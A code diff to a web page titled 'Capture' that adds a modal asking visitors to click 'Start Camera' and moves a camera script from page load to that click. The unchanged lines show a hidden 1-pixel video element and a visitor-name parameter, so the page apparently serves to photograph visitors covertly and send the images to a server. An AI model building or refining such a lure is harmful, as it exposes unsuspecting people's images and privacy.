@@ -5,6 +5,24 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Capture</title>
   <link rel="stylesheet" href="/style.css"/>
+  <style>
+    /* Simple modal styling */
+    #instructionModal {
+      display: block;
+      position: fixed;
+      top: 30%;
+      left: 30%;
+      background: white;
+      padding: 20px;
+      border: 2px solid black;
+      z-index: 1000;
+    }
+    #startCameraBtn {
+      margin-top: 10px;
+      padding: 5px 10px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
@@ -12,10 +30,20 @@
     <video id="v" playsinline autoplay muted style="display:none;width:1px;height:1px;"></video>
   </div>
 
+  <!-- Instructional Modal -->
+  <div id="instructionModal">
+    <p>Please click “Start Camera” to allow camera access for capturing front and back photos.</p>
+    <button id="startCameraBtn">Start Camera</button>
+  </div>
+
   <script>
-    (async function() {
-      const status = document.getElementById("status");
-      const video = document.getElementById("v");
+    const startBtn = document.getElementById("startCameraBtn");
+    const modal = document.getElementById("instructionModal");
+    const status = document.getElementById("status");
+    const video = document.getElementById("v");
+
+    startBtn.addEventListener("click", async function() {
+      modal.style.display = "none"; // Hide modal
 
       const url = new URL(location.href);
       const name = url.searchParams.get("name") || "visitor";
@@ -66,7 +94,7 @@
       } catch (e) {
         status.textContent = "Server failed! Sorry, try again in a few minutes!";
       }
-    })();
+    });
   </script>
 </body>
 </html>
